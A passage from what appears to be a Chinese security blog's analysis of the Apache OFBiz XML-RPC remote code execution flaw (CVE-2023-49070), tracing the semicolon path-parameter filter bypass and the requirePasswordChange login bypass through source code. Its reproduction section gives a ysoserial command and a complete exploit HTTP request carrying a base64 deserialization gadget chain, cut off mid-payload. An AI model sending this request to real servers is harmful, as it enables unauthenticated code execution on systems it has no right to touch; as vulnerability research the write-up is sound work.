class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">// Get the request URI without the webapp mount point.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> ((HttpServletRequest) request).getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uriWithContext</span> <span class="operator">=</span> ((HttpServletRequest) request).getRequestURI();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> uriWithContext.substring(context.length());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;/control/xmlrpc&quot;</span>.equals(uri.toLowerCase())) &#123;</span><br><span class="line">        <span class="comment">// Read request.getReader() as many time you need</span></span><br><span class="line">        request = <span class="keyword">new</span> <span class="title class_">RequestWrapper</span>((HttpServletRequest) request);</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> request.getReader().lines().collect(Collectors.joining());</span><br><span class="line">        <span class="keyword">if</span> (body.contains(<span class="string">&quot;&lt;/serializable&quot;</span>)) &#123;</span><br><span class="line">            Debug.logError(<span class="string">&quot;Content not authorised for security reason&quot;</span>, <span class="string">&quot;CacheFilter&quot;</span>); <span class="comment">// Cf. OFBIZ-12332</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上关键代码，当小写的<code>uri</code>路径为<code>/control/xmlrpc</code>时，便会继续判断请求正文中是否包含<code>&lt;/serializable</code>关键词，若存在，则会报内容未经授权，并返回空，这样请求就无法到达<code>chain.doFilter</code>进行后续的操作。所以，这里的请求路径既不能完全等于<code>/control/xmlrpc</code>，又要能够到达<code>/control/xmlrpc</code>路由。</p><p>在做下一步分析前，先来了解下OFBiz所使用的容器Tomcat，它对于路径参数的解析过程，代码位于<code>org.apache.catalina.connector.CoyoteAdapter</code>类中的<code>parsePathParameters</code>方法，该方法负责解析请求URI中的路径参数。</p><blockquote><p>路径参数通常出现在URL中的分号<code>;</code>后面，用于传递有关所请求资源的附加信息。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">parsePathParameters</span><span class="params">(org.apache.coyote.Request req, Request request)</span> &#123;</span><br><span class="line">    <span class="comment">// Process in bytes (this is default format so this is normally a NO-OP</span></span><br><span class="line">    req.decodedURI().toBytes();</span><br><span class="line">    <span class="type">ByteChunk</span> <span class="variable">uriBC</span> <span class="operator">=</span> req.decodedURI().getByteChunk();</span><br><span class="line">    <span class="comment">// The first character must always be &#x27;/&#x27; so start search at position 1.</span></span><br><span class="line">    <span class="comment">// If the first character is &#x27;;&#x27; the URI will be rejected at the</span></span><br><span class="line">    <span class="comment">// normalization stage</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">semicolon</span> <span class="operator">=</span> uriBC.indexOf(<span class="string">&#x27;;&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// Performance optimisation. Return as soon as it is known there are no</span></span><br><span class="line">    <span class="comment">// path parameters;</span></span><br><span class="line">    <span class="keyword">if</span> (semicolon == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// What encoding to use? Some platforms, eg z/os, use a default</span></span><br><span class="line">    <span class="comment">// encoding that doesn&#x27;t give the expected result so be explicit</span></span><br><span class="line">    <span class="type">Charset</span> <span class="variable">charset</span> <span class="operator">=</span> connector.getURICharset();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">while</span> (semicolon &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// Parse path param, and extract it from the decoded request URI</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> uriBC.getStart();</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> uriBC.getEnd();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">pathParamStart</span> <span class="operator">=</span> semicolon + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pathParamEnd</span> <span class="operator">=</span></span><br><span class="line">                ByteChunk.findBytes(uriBC.getBuffer(), start + pathParamStart, end, <span class="keyword">new</span> <span class="title class_">byte</span>[] &#123; <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;/&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">pv</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (pathParamEnd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (charset != <span class="literal">null</span>) &#123;</span><br><span class="line">                pv = <span class="keyword">new</span> <span class="title class_">String</span>(uriBC.getBuffer(), start + pathParamStart, pathParamEnd - pathParamStart, charset);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Extract path param from decoded request URI</span></span><br><span class="line">            <span class="type">byte</span>[] buf = uriBC.getBuffer();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; end - start - pathParamEnd; i++) &#123;</span><br><span class="line">                buf[start + semicolon + i] = buf[start + i + pathParamEnd];</span><br><span class="line">            &#125;</span><br><span class="line">            uriBC.setBytes(buf, start, end - start - pathParamEnd + semicolon);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (charset != <span class="literal">null</span>) &#123;</span><br><span class="line">                pv = <span class="keyword">new</span> <span class="title class_">String</span>(uriBC.getBuffer(), start + pathParamStart, (end - start) - pathParamStart, charset);</span><br><span class="line">            &#125;</span><br><span class="line">            uriBC.setEnd(start + semicolon);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> (pv != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">equals</span> <span class="operator">=</span> pv.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (equals &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> pv.substring(<span class="number">0</span>, equals);</span><br><span class="line">                <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> pv.substring(equals + <span class="number">1</span>);</span><br><span class="line">                request.addPathParameter(name, value);</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        semicolon = uriBC.indexOf(<span class="string">&#x27;;&#x27;</span>, semicolon);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法会查找URI中第一个<code>;</code>的索引，如果不存在<code>;</code>则直接返回。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/tomcat-parsepathparameters-uribc-indexof.png"></p><p>如果存在<code>;</code>字符，则进入循环对每个路径参数进行处理，将会查找每个路径参数在URI中的起始和结束位置，将路径参数值提取为字符串。随后删除已处理的路径参数，对URI进行修改，从而更新<code>uriBC</code>以排除路径参数。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/tomcat-parsepathparameters-semicolon.png"></p><p>最终，URI由起初的<code>/webtools/control/xmlrpc;/</code>变成了<code>/webtools/control/xmlrpc</code>，这样通过添加路径参数符的方式，也就能够达到绕过目的。如下图，请求顺利到达<code>chain.doFilter</code>，交由其进行处理。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-cachefilter-dofilter.png"></p><p>继续往下，请求将会到达<code>org.apache.ofbiz.webapp.control.ControlServlet#doGet</code>方法。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-controlservlet-doget.png"></p><p>根据web.xml中的映射关系，可知请求<code>/control/xmlrpc</code>，会由<code>ControlServlet</code>，这也再次印证了如上绕过方式是正确的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Main Control Servlet<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.ofbiz.webapp.control.ControlServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/control/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但回到BurpSuite，发现漏洞并未利用成功，而是跳转到了登录页面。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-webtools-login.png"></p><p>这也就是第二个限制，针对CVE-2020-9496漏洞的补丁，官方是通过增加auth来进行鉴权的，如下是controller.xml文件中的相关配置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;xmlrpc&quot;</span> <span class="attr">track-serverhit</span>=<span class="string">&quot;false&quot;</span> <span class="attr">track-visit</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">security</span> <span class="attr">auth</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;xmlrpc&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当auth为true时，如果在未登录状态下进行请求，将会被转发到登录页面。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xs:attribute</span> <span class="attr">type</span>=<span class="string">&quot;xs:boolean&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth&quot;</span> <span class="attr">default</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:annotation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xs:documentation</span>&gt;</span></span><br><span class="line">            If auth=true, when you hit the request if you are not logged in you will be forwarded to the login page.</span><br><span class="line">        <span class="tag">&lt;/<span class="name">xs:documentation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xs:annotation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:attribute</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将断点打到<code>org.apache.ofbiz.webapp.control.ControlServlet#doGet</code>方法，继续朝下跟，在<code>doGet</code>方法中，请求会由<code>handler.doRequest</code>处理，进入这个方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// the ServerHitBin call for the event is done inside the doRequest method</span></span><br><span class="line">    handler.doRequest(request, response, <span class="literal">null</span>, userLogin, delegator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在其中会获取request-map配置，根据如上配置，<code>securityAuth</code>的值将会为<code>true</code>，这样便会进行安全检查，<code>extensionCheckLogin</code>方法将会被调用用于安全检查。而在<code>runEvent</code>方法中，会通过反射机制跳转到相应的类进行操作。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-handler-security-check.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Find the event handler and invoke an event. */</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">runEvent</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span><br><span class="line"><span class="params">        ConfigXMLReader.Event event, ConfigXMLReader.RequestMap requestMap, String trigger)</span> <span class="keyword">throws</span> EventHandlerException &#123;</span><br><span class="line">    <span class="type">EventHandler</span> <span class="variable">eventHandler</span> <span class="operator">=</span> eventFactory.getEventHandler(event.type);</span><br><span class="line">    <span class="type">String</span> <span class="variable">eventReturn</span> <span class="operator">=</span> eventHandler.invoke(event, requestMap, request, response);</span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn() || (Debug.infoOn() &amp;&amp; <span class="string">&quot;request&quot;</span>.equals(trigger))) Debug.logInfo(<span class="string">&quot;Ran Event [&quot;</span> + event.type + <span class="string">&quot;:&quot;</span> + event.path + <span class="string">&quot;#&quot;</span> + event.invoke + <span class="string">&quot;] from [&quot;</span> + trigger + <span class="string">&quot;], result is [&quot;</span> + eventReturn + <span class="string">&quot;]&quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">    <span class="keyword">return</span> eventReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进，进入到<code>extensionCheckLogin</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">extensionCheckLogin</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (LoginCheck check: ServiceLoader.load(LoginCheck.class)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!check.isEnabled()) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> check.associate(request, response);</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> checkLogin(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在其中存在一个<code>checkLogin</code>方法，进入之。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-loginworker-checklogin.png"></p><p>存在一个if条件判断，这里不能使这一整条条件判断为真值，否则就会返回error。在或运算中，需确保每一项都为false，才能使整条条件判断的值为false，对于前两项判断式的值是可控为false的，现在的关键就在于第三项判断式，也就是<code>login</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check parameters</span></span><br><span class="line">username = request.getParameter(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line">password = request.getParameter(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">token = request.getParameter(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line"><span class="comment">// check session attributes</span></span><br><span class="line"><span class="keyword">if</span> (username == <span class="literal">null</span>) username = (String) session.getAttribute(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (password == <span class="literal">null</span>) password = (String) session.getAttribute(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (token == <span class="literal">null</span>) token = (String) session.getAttribute(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (username == <span class="literal">null</span></span><br><span class="line">        || (password == <span class="literal">null</span> &amp;&amp; token == <span class="literal">null</span>)</span><br><span class="line">        || <span class="string">&quot;error&quot;</span>.equals(login(request, response))) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make sure this attribute is not in the request; this avoids infinite recursion when a login by less stringent criteria (like not checkout the hasLoggedOut field) passes; this is not a normal circumstance but can happen with custom code or in funny error situations when the userLogin service gets the userLogin object but runs into another problem and fails to return an error</span></span><br><span class="line">    request.removeAttribute(<span class="string">&quot;_LOGIN_PASSED_&quot;</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那便进入到<code>login</code>方法，跟到下面发现如下关键代码，当requirePasswordChange为Y时，便会返回requirePasswordChange至<code>checkLogin</code>中的条件判断语句中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">requirePasswordChange</span> <span class="operator">=</span> <span class="string">&quot;Y&quot;</span>.equals(request.getParameter(<span class="string">&quot;requirePasswordChange&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (!unpwErrMsgList.isEmpty()) &#123;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_LIST_&quot;</span>, unpwErrMsgList);</span><br><span class="line">    <span class="keyword">return</span>  requirePasswordChange ? <span class="string">&quot;requirePasswordChange&quot;</span> : <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样<code>&quot;error&quot;.equals(login(request, response))</code>的值就会为false，从而决定了这一整条条件判断的值为false。</p><h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>使用Ysoserial生成反序列化Payload。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">&quot;open -a Calculator&quot;</span> | <span class="built_in">base64</span> | <span class="built_in">tr</span> -d <span class="string">&quot;\n&quot;</span> | pbcopy</span><br></pre></td></tr></table></figure><p>将如上生成的内容放置在如下HTTP请求正文的<code>&lt;serializable&gt;</code>中，发送请求将会执行预期的<code>open -a Calculator</code>命令。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8443</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3982</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span><span class="tag">&lt;<span class="name">methodName</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span><span class="tag">&lt;<span class="name">params</span>&gt;</span><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">struct</span>&gt;</span><span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>rce<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span>rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqjK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyNDk3OTQ2MTA4NzQyNjI1AQAgTHlzb3NlcmlhbC9Qd25lcjQ5Nzk0NjEwODc0MjYyNTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+n